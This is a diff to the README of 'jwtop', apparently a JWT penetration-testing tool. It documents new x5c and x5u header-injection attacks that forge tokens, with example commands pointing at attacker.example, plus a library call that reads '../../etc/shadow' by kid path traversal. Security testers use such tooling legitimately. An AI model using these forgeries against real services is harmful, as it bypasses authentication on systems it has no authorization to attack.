@@ -270,6 +270,7 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 | `--kid-sql-table` | Table name for the kid SQL injection payload (default `tokens`) |
 | `--kid-path` | File path for the kid path traversal payload (default `/dev/null`) |
 | `--jku-server-addr` | Bind address for a local JWKS server used by the `jkuinjection` check, e.g. `0.0.0.0:8089` (must be reachable by the target; check is skipped if unset) |
+| `--x5u-server-addr` | Bind address for a local certificate server used by the `x5uinjection` check, e.g. `0.0.0.0:8090` (must be reachable by the target; check is skipped if unset) |
 | `--token-in` | Where to place the exploited JWT: `header`, `cookie`, `query`, or `body` (default `header`) |
 | `--token-name` | Header/cookie/query/form-field name for the JWT (default `Authorization` for header, `token` otherwise) |
 | `--token-prefix` | Value prefix before the token, e.g. `Bearer ` (default `Bearer ` only for the default Authorization header) |
@@ -290,7 +291,7 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 | `nullsig` | Token has an empty signature segment |
 | `weaksecret` | Cracks the HMAC signing secret via dictionary attack |
 
-**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114), `jkuinjection` (RSA/ECDSA-only, requires `--jku-server-addr`).
+**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114), `jkuinjection` (RSA/ECDSA-only, requires `--jku-server-addr`), `x5cinjection` (RSA/ECDSA-only), `x5uinjection` (RSA/ECDSA-only, requires `--x5u-server-addr`).
 
 > Command and LDAP kid injection (`jwtop exploit kidinjection --mode command|ldap`) are exploit-only for now — the `crack` server probe does not yet include these two techniques.
 
@@ -374,6 +375,8 @@ jwtop exploit <subcommand> <token> [flags]
 | `kidinjection` | Manipulate the `kid` header field and re-sign |
 | `jwkinjection` | Embed a self-signed JWK in the header and re-sign (CVE-2018-0114) |
 | `jkuinjection` | Point `jku` at an attacker-controlled JWKS URL and re-sign |
+| `x5cinjection` | Embed a self-signed certificate in the `x5c` header and re-sign |
+| `x5uinjection` | Point `x5u` at an attacker-controlled certificate URL and re-sign |
 
 **algnone**
 
@@ -480,6 +483,33 @@ jwtop exploit jkuinjection $TOKEN --key /path/to/private.pem --url https://attac
 | `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
 | `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
 | `--url` | Attacker-controlled URL serving a JWKS with the matching public key (required) |
+
+**x5cinjection** — generates a self-signed RSA/ECDSA key pair and a throwaway X.509 certificate, embeds the certificate's DER bytes directly in the token's `x5c` header field, and re-signs with the matching private key. Servers that trust a certificate embedded in `x5c` instead of validating it against a pinned CA or certificate store accept the forged token.
+
+```sh
+jwtop exploit x5cinjection $TOKEN                            # generates an RS256 key pair
+jwtop exploit x5cinjection $TOKEN --alg ES256                 # generates an ES256 key pair
+jwtop exploit x5cinjection $TOKEN --key /path/to/private.pem  # re-sign with an existing key instead
+```
+
+| Flag | Description |
+|------|-------------|
+| `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
+| `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
+
+**x5uinjection** — generates a self-signed RSA/ECDSA key pair and a throwaway X.509 certificate, points the token's `x5u` header at `--url`, and re-signs with the matching private key. `--url` must serve the certificate as a PEM document — this command only sets the header and signs; it does not host the certificate itself. Servers that fetch `x5u` and trust its contents without validating the URL against an allowlist or pinned CA accept the forged token. To have jwtop also host the certificate during a live probe, use `jwtop crack --x5u-server-addr` instead.
+
+```sh
+jwtop exploit x5uinjection $TOKEN --url https://attacker.example/cert.pem                            # generates an RS256 key pair
+jwtop exploit x5uinjection $TOKEN --alg ES256 --url https://attacker.example/cert.pem                # generates an ES256 key pair
+jwtop exploit x5uinjection $TOKEN --key /path/to/private.pem --url https://attacker.example/cert.pem # re-sign with an existing key instead
+```
+
+| Flag | Description |
+|------|-------------|
+| `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
+| `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
+| `--url` | Attacker-controlled URL serving a PEM certificate with the matching public key (required) |
 
 ---
 
@@ -615,6 +645,14 @@ tokens, err  = exploit.KidLDAPInjectionAll(tokenString, []byte(""))     // one t
 token, err   = exploit.KidInjection(tokenString, "../../etc/shadow", jwtlib.SigningMethodHS256, []byte(""))
 token, err   = exploit.JWKInjection(tokenString, jwtlib.SigningMethodRS256)                    // generates key pair
 token, err   = exploit.JWKInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey) // use existing key
+token, err   = exploit.JKUInjection(tokenString, jwtlib.SigningMethodRS256, jwksURL)                    // generates key pair
+token, err   = exploit.JKUInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey, jwksURL) // use existing key
+token, srv, err := exploit.JKUInjectionWithLocalServer(tokenString, jwtlib.SigningMethodRS256, "127.0.0.1:0") // also hosts the JWKS
+token, err   = exploit.X5CInjection(tokenString, jwtlib.SigningMethodRS256)                    // generates key pair + self-signed cert
+token, err   = exploit.X5CInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey) // use existing key
+token, err   = exploit.X5UInjection(tokenString, jwtlib.SigningMethodRS256, certURL)                    // generates key pair + self-signed cert
+token, err   = exploit.X5UInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey, certURL) // use existing key
+token, srv, err := exploit.X5UInjectionWithLocalServer(tokenString, jwtlib.SigningMethodRS256, "127.0.0.1:0") // also hosts the certificate
 
 // HMAC secret cracking
 result, err := exploit.CrackSecret(tokenString, exploit.WeakSecrets(), 8)
